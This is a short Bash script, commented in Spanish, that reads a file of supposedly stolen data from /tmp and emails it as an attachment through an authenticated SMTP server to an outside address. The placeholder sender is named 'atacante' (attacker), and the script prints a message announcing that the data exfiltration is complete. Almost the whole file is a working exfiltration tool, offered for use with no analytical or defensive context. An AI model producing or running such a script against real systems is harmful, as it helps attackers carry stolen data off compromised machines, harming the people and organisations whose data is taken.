#!/bin/bash

# Configuración del servidor SMTP y credenciales
SMTP_SERVER="smtp.ejemplo.com"
SMTP_PORT="587"
SMTP_USER="usuarioSMTP"
SMTP_PASS="contraseñaSMTP"
SMTP_FROM="atacante@ejemplo.com"
SMTP_TO="receptor@ejemplo.com"
SUBJECT="Datos Exfiltrados"
BODY="Adjunto encontrarás los datos exfiltrados."
ATTACHMENT="/tmp/exfiltrated_data.txt"

# Verificar si el archivo existe
if [ ! -f "$ATTACHMENT" ]; then
    echo "El archivo $ATTACHMENT no existe."
    exit 1
fi

# Enviar el correo electrónico con el archivo adjunto
echo "$BODY" | mailx -s "$SUBJECT" -a "$ATTACHMENT" -r "$SMTP_FROM" "$SMTP_TO" --smtp="$SMTP_SERVER:$SMTP_PORT" --smtp-auth=login --smtp-auth-user="$SMTP_USER" --smtp-auth-password="$SMTP_PASS"

# Notificación de finalización
echo "[+] Exfiltración de datos por correo completada."
